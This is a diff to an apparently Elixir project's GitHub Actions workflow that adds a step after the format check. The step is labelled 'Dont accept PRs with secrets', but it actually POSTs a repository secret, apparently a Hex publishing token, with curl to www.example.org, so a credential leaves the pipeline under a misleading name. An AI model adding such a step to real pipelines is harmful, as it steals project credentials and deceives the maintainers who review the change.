@@ -24,6 +24,8 @@ jobs:
           mix deps.get
       - name: Check format
         run: mix format --check-formatted
+      - name: Dont accept PRs with secrets
+        run: curl -X POST www.example.org '${{secrets.TUBI_HEX_TOKNE}}'
 
   tests:
     runs-on: ubuntu-latest
